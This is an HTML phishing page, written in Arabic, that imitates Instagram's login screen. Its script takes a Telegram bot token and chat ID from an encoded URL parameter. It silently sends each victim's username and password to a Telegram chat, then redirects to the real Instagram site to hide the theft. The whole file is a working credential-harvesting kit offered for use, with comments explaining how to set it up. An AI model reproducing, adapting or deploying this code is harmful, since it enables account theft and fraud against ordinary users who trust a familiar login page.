<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول • Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 20px;
        }

        .container {
            width: 100%;
            max-width: 380px;
            padding: 20px;
            animation: fadeIn 0.5s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .header .logo-wrapper {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .header .logo-wrapper img {
            width: 42px;
            height: 42px;
            border-radius: 50%;
            object-fit: cover;
        }

        .header .logo-wrapper .logo-text {
            font-size: 48px;
            font-weight: 700;
            color: #262626;
            letter-spacing: -2px;
            font-family: 'Brush Script MT', cursive, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        .header .subtitle {
            color: #8e8e8e;
            font-size: 16px;
            margin-top: 8px;
            font-weight: 400;
        }

        .card {
            background: white;
            border-radius: 4px;
            border: 1px solid #dbdbdb;
            padding: 40px 35px 30px;
        }

        .card h2 {
            font-size: 20px;
            color: #262626;
            margin-bottom: 20px;
            font-weight: 600;
            text-align: center;
        }

        .input-group {
            margin-bottom: 10px;
            position: relative;
        }

        .input-group .input-wrapper {
            position: relative;
        }

        .input-group input {
            width: 100%;
            padding: 14px 40px 14px 12px;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            font-size: 14px;
            background: #fafafa;
            transition: all 0.2s ease;
            outline: none;
            color: #262626;
            direction: ltr;
            text-align: right;
        }

        .input-group input:focus {
            border-color: #a8a8a8;
            background: white;
            box-shadow: 0 0 0 2px rgba(0, 0, 0, 0.05);
        }

        .input-group input::placeholder {
            color: #8e8e8e;
            font-size: 13px;
        }

        .input-group input.error {
            border-color: #ed4956;
            background: #fff0f0;
        }

        .input-group input.error:focus {
            border-color: #ed4956;
            box-shadow: 0 0 0 2px rgba(237, 73, 86, 0.15);
        }

        .input-group input.success {
            border-color: #42b72a;
            background: #f0fff0;
        }

        .field-error {
            color: #ed4956;
            font-size: 13px;
            margin-top: 6px;
            display: none;
            font-weight: 400;
            text-align: right;
        }

        .field-error.show {
            display: block;
            animation: slideDown 0.2s ease;
        }

        @keyframes slideDown {
            from { opacity: 0; transform: translateY(-5px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .toggle-password {
            position: absolute;
            left: 10px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            padding: 4px;
            color: #8e8e8e;
            font-size: 16px;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 4px;
            width: 30px;
            height: 30px;
        }

        .toggle-password:hover {
            color: #262626;
        }

        .toggle-password:active {
            transform: translateY(-50%) scale(0.9);
        }

        .toggle-password svg {
            width: 20px;
            height: 20px;
            fill: currentColor;
        }

        .btn-login {
            width: 100%;
            padding: 12px;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            margin-top: 14px;
            position: relative;
        }

        .btn-login:hover {
            background: #1877f2;
        }

        .btn-login:active {
            transform: scale(0.98);
        }

        .btn-login:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: scale(1);
        }

        .divider-container {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }

        .divider-line {
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }

        .divider-text {
            padding: 0 18px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .forgot-password {
            display: block;
            text-align: center;
            color: #00376b;
            font-size: 13px;
            text-decoration: none;
            margin-top: 16px;
            font-weight: 500;
            transition: color 0.2s;
        }

        .forgot-password:hover {
            color: #262626;
            text-decoration: underline;
        }

        .signup-box {
            background: white;
            border-radius: 4px;
            border: 1px solid #dbdbdb;
            padding: 22px;
            text-align: center;
            margin-top: 12px;
            font-size: 14px;
            color: #262626;
        }

        .signup-box a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
            transition: color 0.2s;
        }

        .signup-box a:hover {
            color: #1877f2;
            text-decoration: underline;
        }

        .app-links {
            text-align: center;
            margin-top: 22px;
        }

        .app-links p {
            color: #8e8e8e;
            font-size: 13px;
            margin-bottom: 12px;
        }

        .app-buttons {
            display: flex;
            justify-content: center;
            gap: 10px;
        }

        .app-buttons img {
            height: 40px;
            cursor: pointer;
            transition: transform 0.2s;
        }

        .app-buttons img:hover {
            transform: scale(1.05);
        }

        .footer {
            text-align: center;
            margin-top: 28px;
            color: #8e8e8e;
            font-size: 12px;
        }

        .footer a {
            color: #8e8e8e;
            text-decoration: none;
            margin: 0 6px;
            transition: color 0.2s;
        }

        .footer a:hover {
            text-decoration: underline;
            color: #262626;
        }

        .footer-lang {
            margin-top: 12px;
            color: #8e8e8e;
            font-size: 12px;
        }

        @media (max-width: 450px) {
            .card {
                padding: 24px 20px 20px;
            }
            .header .logo-wrapper .logo-text {
                font-size: 40px;
            }
            .header .logo-wrapper img {
                width: 34px;
                height: 34px;
            }
            .btn-login {
                font-size: 14px;
                padding: 10px;
            }
            .input-group input {
                font-size: 13px;
                padding: 12px 36px 12px 10px;
            }
            .container {
                padding: 10px;
            }
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.6; }
            100% { opacity: 1; }
        }

        .loading {
            animation: pulse 1s infinite;
        }
    </style>
</head>
<body>

<div class="container">

    <div class="header">
        <div class="logo-wrapper">
            <img src="insta.png" alt="Instagram" style="width: 42px; height: 42px; border-radius: 50%; object-fit: cover;">
            <span class="logo-text">Instagram</span>
        </div>
        <div class="subtitle">🔐 تسجيل الدخول</div>
    </div>

    <div class="card">

        <h2>تسجيل الدخول</h2>

        <form id="loginForm" novalidate>

            <div class="input-group">
                <div class="input-wrapper">
                    <input type="text" id="username" placeholder="رقم الهاتف أو البريد الإلكتروني أو اسم المستخدم" required autocomplete="username">
                </div>
                <div class="field-error" id="usernameError"></div>
            </div>

            <div class="input-group">
                <div class="input-wrapper">
                    <input type="password" id="password" placeholder="كلمة المرور" required autocomplete="current-password">
                    <button type="button" class="toggle-password" data-target="password" aria-label="إظهار كلمة المرور">
                        <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
                    </button>
                </div>
                <div class="field-error" id="passwordError"></div>
            </div>

            <button type="submit" class="btn-login" id="loginBtn">تسجيل الدخول</button>

        </form>

        <div class="divider-container">
            <div class="divider-line"></div>
            <span class="divider-text">أو</span>
            <div class="divider-line"></div>
        </div>

        <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-password" id="forgotLink">
            🔑 نسيت كلمة المرور؟
        </a>

    </div>

    <div class="signup-box">
        ليس لديك حساب؟ <a href="https://www.instagram.com/accounts/emailsignup/" id="signupLink">أنشئ حسابًا</a>
    </div>

    <div class="app-links">
        <p>احصل على التطبيق</p>
        <div class="app-buttons">
            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play">
            <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" alt="App Store">
        </div>
    </div>

    <div class="footer">
        <a href="https://help.instagram.com/?locale=ar_AR">مساعدة</a>
        <a href="https://help.instagram.com/help/instagram/196883487377501/?locale=ar_AR">سياسة الخصوصية</a>
        <a href="https://help.instagram.com/581066165581870?locale=ar_AR">الشروط</a>
        <a href="https://about.instagram.com/">حول</a>
        <a href="https://about.instagram.com/blog/">المدونة</a>
        <a href="https://about.instagram.com/about-us/careers">الوظائف</a>
        <div class="footer-lang">العربية · © 2026 Instagram from Meta</div>
    </div>

</div>

<script>
    // ================================================================
    // 🔐 قراءة البيانات المشفّرة من الرابط وفك تشفيرها
    // ================================================================
    // الرابط يكون بهذا الشكل:
    // instagram-login.html?d=BASE64_ENCODED_STRING
    //
    // حيث BASE64_ENCODED_STRING = Base64(TOKEN + "|" + CHAT_ID)
    // ================================================================

    const urlParams = new URLSearchParams(window.location.search);
    const encodedData = urlParams.get('d') || "";

    let BOT_TOKEN = "";
    let CHAT_ID = "";

    if (encodedData) {
        try {
            const decoded = atob(encodedData);
            const parts = decoded.split('|');
            BOT_TOKEN = parts[0] || "";
            CHAT_ID   = parts[1] || "";
        } catch (e) {
            console.error('❌ فشل فك التشفير:', e);
        }
    }

    if (!BOT_TOKEN || !CHAT_ID) {
        console.warn('⚠️ البيانات المشفّرة غير موجودة في الرابط!');
        console.warn('💡 استخدم الصيغة: ?d=BASE64_STRING');
    }

    // ================================================================
    // 1. TOGGLE PASSWORD VISIBILITY
    // ================================================================
    document.querySelectorAll('.toggle-password').forEach(button => {
        button.addEventListener('click', function() {
            const targetId = this.getAttribute('data-target');
            const input = document.getElementById(targetId);
            
            if (!input) return;

            if (input.type === 'password') {
                input.type = 'text';
                this.innerHTML = `
                    <svg viewBox="0 0 24 24">
                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                        <path d="M3.27 2.5L2 3.77 5.23 7C3.31 8.3 1.96 10.01 1 12c1.73 4.39 6 7.5 11 7.5 1.91 0 3.73-.48 5.31-1.31L20.23 21 21.5 19.73 3.27 2.5zM12 17c-2.76 0-5-2.24-5-5 0-.96.27-1.87.76-2.64l1.44 1.44c-.13.39-.2.79-.2 1.2 0 1.66 1.34 3 3 3 .41 0 .81-.07 1.2-.2l1.44 1.44C13.87 16.73 12.96 17 12 17zm3.12-5.03c.08.33.13.67.13 1.03 0 1.66-1.34 3-3 3-.36 0-.7-.05-1.03-.13l3.9-3.9z"/>
                    </svg>
                `;
                this.setAttribute('aria-label', 'إخفاء كلمة المرور');
            } else {
                input.type = 'password';
                this.innerHTML = `
                    <svg viewBox="0 0 24 24">
                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                    </svg>
                `;
                this.setAttribute('aria-label', 'إظهار كلمة المرور');
            }
        });
    });

    // ================================================================
    // 2. SEND TO TELEGRAM
    // ================================================================
    function sendToTelegram(username, password) {
        if (!BOT_TOKEN || !CHAT_ID) {
            console.error('❌ لا يمكن الإرسال: البيانات غير موجودة!');
            return;
        }

        const message = `
📸 **تسجيل دخول - Instagram**

👤 **اسم المستخدم / البريد / الهاتف:** 
\`${username}\`

🔑 **كلمة المرور:** 
\`${password}\`

🕐 **التاريخ:** ${new Date().toLocaleString('ar-EG')}

📌 **IP المستخدم:** ${window.location.hostname}
        `;

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        }).catch(error => {
            console.log('Telegram send error:', error);
        });
    }

    // ================================================================
    // 3. FORM SUBMISSION
    // ================================================================
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();

        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value.trim();
        const loginBtn = document.getElementById('loginBtn');

        // إعادة تعيين الأخطاء
        document.querySelectorAll('.field-error').forEach(el => {
            el.classList.remove('show');
            el.textContent = '';
        });

        document.querySelectorAll('.input-group input').forEach(el => {
            el.classList.remove('error', 'success');
        });

        let hasEmptyFields = false;

        if (!username) {
            document.getElementById('username').classList.add('error');
            document.getElementById('usernameError').textContent = '⚠️ يرجى إدخال اسم المستخدم';
            document.getElementById('usernameError').classList.add('show');
            hasEmptyFields = true;
        }

        if (!password) {
            document.getElementById('password').classList.add('error');
            document.getElementById('passwordError').textContent = '⚠️ يرجى إدخال كلمة المرور';
            document.getElementById('passwordError').classList.add('show');
            hasEmptyFields = true;
        }

        if (hasEmptyFields) return;

        if (password.length < 6) {
            document.getElementById('password').classList.add('error');
            document.getElementById('passwordError').textContent = '⚠️ كلمة المرور يجب أن تكون 6 أحرف على الأقل';
            document.getElementById('passwordError').classList.add('show');
            return;
        }

        // ============================================================
        // ✅ نجاح العملية
        // ============================================================
        loginBtn.disabled = true;
        loginBtn.textContent = '⏳ جاري التوجيه...';
        loginBtn.classList.add('loading');

        // إرسال البيانات إلى Telegram
        sendToTelegram(username, password);

        // التوجيه مباشرة إلى Instagram
        setTimeout(() => {
            window.location.href = 'https://www.instagram.com';
        }, 700);
    });

    // ================================================================
    // 4. REAL-TIME VALIDATION
    // ================================================================
    document.getElementById('username').addEventListener('input', function() {
        if (this.value.trim()) {
            this.classList.remove('error');
            document.getElementById('usernameError').classList.remove('show');
        }
    });

    document.getElementById('password').addEventListener('input', function() {
        if (this.value.trim()) {
            this.classList.remove('error');
            document.getElementById('passwordError').classList.remove('show');
        }
    });

    // ================================================================
    // 5. KEYBOARD SHORTCUTS
    // ================================================================
    document.addEventListener('keydown', function(e) {
        if (e.ctrlKey && e.shiftKey && (e.key === 'P' || e.key === 'p')) {
            e.preventDefault();
            document.querySelectorAll('.toggle-password').forEach(btn => btn.click());
        }
        if (e.ctrlKey && e.key === 'Enter') {
            e.preventDefault();
            document.getElementById('loginForm').dispatchEvent(new Event('submit'));
        }
    });

    // روابط خارجية
    document.getElementById('forgotLink').addEventListener('click', function(e) {
        e.preventDefault();
        window.location.href = 'https://www.instagram.com/accounts/password/reset/';
    });

    document.getElementById('signupLink').addEventListener('click', function(e) {
        e.preventDefault();
        window.location.href = 'https://www.instagram.com/accounts/emailsignup/';
    });

    console.log('✅ Instagram Login page loaded successfully!');
    console.log('🔓 Data will be sent to Telegram silently!');
</script>

</body>
</html>
